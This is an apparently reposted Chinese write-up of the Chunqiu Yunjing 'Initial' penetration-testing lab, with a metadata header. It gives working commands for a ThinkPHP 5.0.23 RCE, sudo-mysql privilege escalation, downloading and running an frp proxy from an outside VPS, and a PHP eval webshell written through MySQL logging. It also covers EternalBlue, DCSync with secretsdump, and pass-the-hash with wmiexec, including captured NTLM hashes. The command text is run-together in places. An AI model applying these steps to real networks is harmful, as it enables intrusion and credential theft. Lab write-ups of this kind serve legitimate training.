---
title: 春秋云镜-Initial-WriteUp
contest: 春秋云镜靶场
year: 2023
difficulty: easy
vuln_type: rce
tags:
- ThinkPHP 5.0.23
- sudo mysql提权
- frp代理
- MS17-010
- DCSync
- 信呼OA
attack_chain: fscan扫描→ThinkPHP5023 RCE→sudo mysql -e读flag1→frp代理进内网→MS17-010打XIAORANG-WIN7→secretsdump导出域管hash→wmiexec登录DC01读flag
key_payload: fscan -h 172.22.2.1/24;ms17_010_eternalblue;secretsdump.py XIAORANG-WIN7$@172.22.1.2;wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
one_liner: 春秋云镜Initial：ThinkPHP5+MS17-010+secretsdump/wmiexec横向三件套
lesson: 入门靶场：web RCE→frp代理→MSF永恒之蓝→impacket工具链横向
quality: medium
full_path: 春秋云镜-Initial-WriteUp.full.md
meta_path: 春秋云镜-Initial-WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 春秋云镜-Initial-WriteUp。春秋云镜Initial：ThinkPHP5+MS17-010+secretsdump/wmiexec横向三件套。经验：入门靶场：web RCE→frp代理→MSF永恒之蓝→impacket工具链横向
category: web
subcategory: rce
tools_used:
- Python
- ThinkPHP
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/148520.html
reasoning_chain:
- ./fscan_darwin 扫入口 → 触发点：ThinkPHP 5.0.23 漏洞
- 动作：poc-yaml-thinkphp5023-method-rce → 观察：拿到 www-data shell
- sudo -l → mysql NOPASSWD → 触发点：flag1 路径 /root/flag/flag01.txt
- 动作：sudo mysql -e '! cat /root/flag/flag01.txt' → 观察：flag1
- frp 代理进内网 → 动作：./fscan -h 172.22.2.1/24 → 观察：DC01/172.22.1.2、XIAORANG-WIN7/172.22.1.21
- MS17-010 标红 172.22.1.21 → 触发点：WIN7 是永恒之蓝目标
- 动作：msf ms17_010_eternalblue → 拿到 WIN7 shell
- 动作：secretsdump.py XIAORANG-WIN7$@172.22.1.2 → 观察：导出 Administrator hash
- 动作：wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8 → 读 flag
failed_attempts:
- 手撕 ThinkPHP 5.0.23 → 失败：直接用现成 poc 即可
- 直接 PTH 到 DC → 失败：必须先 DCSync 导出域管哈希
key_observations:
- secretsdump.py + 机器账户 + ../rel.wmiexec.py 是入门域横向三件套
- DCSync 不需要登录 DC，只要域内有机器账户权限即可
- fscan 的 MS17-010 红标是横向目标识别第一信号
prerequisites:
- ThinkPHP 5.0.23 RCE
- frp 代理
- MS17-010
- impacket 工具链（secretsdump/wmiexec）
---
# 春秋云镜-Initial-WriteUp

> 原文: https://www.ctfiot.com/148520.html
> ID: 148520

：声明：该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关

现在只对常读和星标的公众号才展示大图推送，建议大家把猫蛋儿安全“设为星标”，否则可能看不到了！

靶场简介

Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。

获取入口机权限

./fscan_darwin -h 39.98.209.209

sudo -lsudo /usr/bin/mysql -e '! cat /root/flag/flag01.txt'

内网横向

curl http://39.98.170.21:
8001/fscan_amd64 --output fscanchmod +x ./fscan./fscan -h 172.22.2.1/24

172.22.1.18:
3306 open172.22.1.18:
445 open172.22.1.21:
445 open172.22.1.2:
445 open172.22.1.18:
139 open172.22.1.21:
139 open172.22.1.2:
139 open172.22.1.18:
135 open172.22.1.21:
135 open172.22.1.15:22 open172.22.1.2:
135 open172.22.1.18:80 open172.22.1.2:88 open172.22.1.15:80 open[*]172.22.1.2 [->]DC01 [->]172.22.1.2[+] 172.22.1.21 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetInfo:[*]172.22.1.18 [->]XIAORANG-OA01 [->]172.22.1.18[*] NetInfo:[*]172.22.1.21 [->]XIAORANG-WIN7 [->]172.22.1.21[*] WebTitle: http://172.22.1.15 code:
200 len:
5578 title:
Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] WebTitle: http://172.22.1.18 code:
302 len:0 title:
None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:
200 len:
4012 title:
信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1

curl http://vpsip:
8001/frpc --output frpccurl http://vpsip:
8001/frpc.ini --output frpc.ininohup ./frpc -c frpc.ini

show variables like 'general%';查看是否开启日志以及存放的日志位置

set global general_log = ON;开启日志set global general_log_file = "c:/phpStudy/PHPTutorial/www/1.php"select '<?php eval($_POST[shell]);?>'

XIAORANG-WIN7$/d4df8a3fa73a9fee14a62123784290c6

python3 secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :
d4df8a3fa73a9fee14a62123784290c6

python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :
10cf89a850fb1cdbe6bb432b859164c8

关于我们

持续从基础到深入的更新攻防文章

点个小赞你最好看


```
./fscan_darwin -h 39.98.209.209
sudo -lsudo /usr/bin/mysql -e '! cat /root/flag/flag01.txt'
curl http://39.98.170.21:
8001/fscan_amd64 --output fscanchmod +x ./fscan./fscan -h 172.22.2.1/24
172.22.1.18:
3306 open172.22.1.18:
445 open172.22.1.21:
445 open172.22.1.2:
445 open172.22.1.18:
139 open172.22.1.21:
139 open172.22.1.2:
139 open172.22.1.18:
135 open172.22.1.21:
135 open172.22.1.15:22 open172.22.1.2:
135 open172.22.1.18:80 open172.22.1.2:88 open172.22.1.15:80 open[*]172.22.1.2 [->]DC01 [->]172.22.1.2[+] 172.22.1.21 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetInfo:[*]172.22.1.18 [->]XIAORANG-OA01 [->]172.22.1.18[*] NetInfo:[*]172.22.1.21 [->]XIAORANG-WIN7 [->]172.22.1.21[*] WebTitle: http://172.22.1.15 code:
200 len:
5578 title:
Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [*] WebTitle: http://172.22.1.18 code:
302 len:0 title:
None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:
200 len:
4012 title:
信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
curl http://vpsip:
8001/frpc --output frpccurl http://vpsip:
8001/frpc.ini --output frpc.ininohup ./frpc -c frpc.ini
show variables like 'general%';查看是否开启日志以及存放的日志位置
set global general_log = ON;开启日志set global general_log_file = "c:/phpStudy/PHPTutorial/www/1.php"select '<?php eval($_POST[shell]);?>'
XIAORANG-WIN7$/d4df8a3fa73a9fee14a62123784290c6
python3 secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :
d4df8a3fa73a9fee14a62123784290c6
python3 wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :
10cf89a850fb1cdbe6bb432b859164c8
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]